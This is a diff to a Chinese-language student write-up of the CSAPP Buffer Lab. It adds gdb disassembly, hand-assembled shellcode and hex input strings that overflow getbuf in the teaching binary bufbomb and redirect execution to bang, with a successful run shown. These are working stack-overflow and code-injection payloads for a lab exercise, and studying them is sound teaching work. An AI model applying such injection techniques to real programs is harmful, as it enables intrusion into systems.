@@ -100,9 +100,26 @@ eip            0x804920b           0x804920b <getbuf+23>
 0x080491f7 <+3>:		sub    $0x38,%esp
 ```
 
-也就是说，字符串是从 0x556835b0 - 32 处开始输入的，而smoke函数的地址为0x08048c18，只需要使得输入字符串的栈结构如下即可：
+再来看getbuf中这一部分汇编代码：
 
-![stack-task-1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stack-task-1.png)
+```
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x080491f4 <+0>:		push   %ebp
+   0x080491f5 <+1>:		mov    %esp,%ebp
+   0x080491f7 <+3>:		sub    $0x38,%esp
+   0x080491fa <+6>:		lea    -0x28(%ebp),%eax      <---------
+   0x080491fd <+9>:		mov    %eax,(%esp)           <---------
+   0x08049200 <+12>:	call   0x8048cfa <Gets>      <---------
+   0x08049205 <+17>:	mov    $0x1,%eax
+   0x0804920a <+22>:	leave  
+   0x0804920b <+23>:	ret    
+End of assembler dump.
+```
+
+也就是说，字符串是从 0x556835b0 - 40 处开始输入的，而smoke函数的地址为0x08048c18，只需要使得输入字符串的栈结构如下即可：
+
+![stack-task-1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stackVisual-task-1.png)
 
 那么输入字符串就是：
 
@@ -192,7 +209,7 @@ mov    %esp,%ebp
 
 所以输入字符串的栈结构应为：
 
-![stack-task-2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stack-task-2.png)
+![stack-task-2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stackVisual-task-2.png)
 
 那么输入字符串就是：
 
@@ -217,3 +234,137 @@ b7 b2 05 10
 
 ![res-task2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task2.png)
 
+3. task3
+
+在bang函数中，global_value是全局变量，和cookie都存在常量区，因此首先找到这俩常量的存储地址，首先需要让getbuf跑到bang函数里：
+
+```
+vim task3.txt
+
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+9d 8c 04 08
+```
+
+同时在bang函数中打上断点：
+
+```
+Breakpoint 1, 0x08048cae in bang ()
+(gdb) disa
+(gdb) disas
+Dump of assembler code for function bang:
+   0x08048c9d <+0>:		push   %ebp
+   0x08048c9e <+1>:		mov    %esp,%ebp
+   0x08048ca0 <+3>:		sub    $0x18,%esp
+   0x08048ca3 <+6>:		mov    0x804d100,%eax
+   0x08048ca8 <+11>:	cmp    0x804d108,%eax
+=> 0x08048cae <+17>:	jne    0x8048cd6 <bang+57>
+   0x08048cb0 <+19>:	mov    %eax,0x8(%esp)
+   0x08048cb4 <+23>:	movl   $0x804a360,0x4(%esp)
+   0x08048cbc <+31>:	movl   $0x1,(%esp)
+   0x08048cc3 <+38>:	call   0x80489c0 <__printf_chk@plt>
+   0x08048cc8 <+43>:	movl   $0x2,(%esp)
+   0x08048ccf <+50>:	call   0x804937b <validate>
+   0x08048cd4 <+55>:	jmp    0x8048cee <bang+81>
+   0x08048cd6 <+57>:	mov    %eax,0x8(%esp)
+   0x08048cda <+61>:	movl   $0x804a50c,0x4(%esp)
+   0x08048ce2 <+69>:	movl   $0x1,(%esp)
+   0x08048ce9 <+76>:	call   0x80489c0 <__printf_chk@plt>
+   0x08048cee <+81>:	movl   $0x0,(%esp)
+   0x08048cf5 <+88>:	call   0x8048900 <exit@plt>
+End of assembler dump.
+```
+
+注意看断点的语句，其实就是比较内存地址0x804d100和0x804d108上的内容，那么看一下这两处存着什么：
+
+```
+(gdb) print (char *) 0x804d100
+$7 = 0x804d100 <global_value> ""
+(gdb) print (char *) 0x804d108
+$10 = 0x804d108 <cookie> "\267\262\005\020\200\365\372"
+(gdb) print /x *0x804d108
+$14 = 0x1005b2b7
+```
+
+那么一目了然，0x804d100存的是global_value，0x804d108存的是cookie，写一段代码，把cookie值放到存global_value那个内存上，再给栈上压入bang函数地址然后ret
+
+```
+mov 0x804d108, %eax
+mov %eax, 0x804d100
+push $0x08048c9d
+ret
+```
+
+获取其机器指令序列：
+
+```
+➜  buflab-handout git:(master) ✗ vim task3.s  
+➜  buflab-handout git:(master) ✗ gcc -m32 -c task3.s
+➜  buflab-handout git:(master) ✗ ls
+ bufbomb                    res-task2.png      task2.txt
+ hex2raw                    stack-task-1.png   task3.o
+'how to buffer attack.md'   stack-task-2.png   task3raw.txt
+ makecookie                 stackVisual.pptx   task3.s
+ res-task1.png              task1.txt          task3.txt
+➜  buflab-handout git:(master) ✗ objdump -d task3.o 
+
+task3.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	a1 08 d1 04 08       	mov    0x804d108,%eax
+   5:	a3 00 d1 04 08       	mov    %eax,0x804d100
+   a:	68 9d 8c 04 08       	push   $0x8048c9d
+   f:	c3 						ret
+```
+
+那么让栈结构如下所示即可：
+
+![stackVisual-task-3](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stackVisual-task-3.png)
+
+新建一个
+
+```
+vim task3final.txt
+```
+
+写入
+
+```
+a1 08 d1 04
+08 a3 00 d1
+04 08 68 9d
+8c 04 08 c3
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+88 35 68 55
+```
+
+试验：
+
+```
+➜  buflab-handout git:(master) ✗ cat task3final.txt | ./hex2raw | ./bufbomb -u bovik
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Bang!: You set global_value to 0x1005b2b7
+VALID
+NICE JOB!
+```
+
+![res-task3](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task3.png)
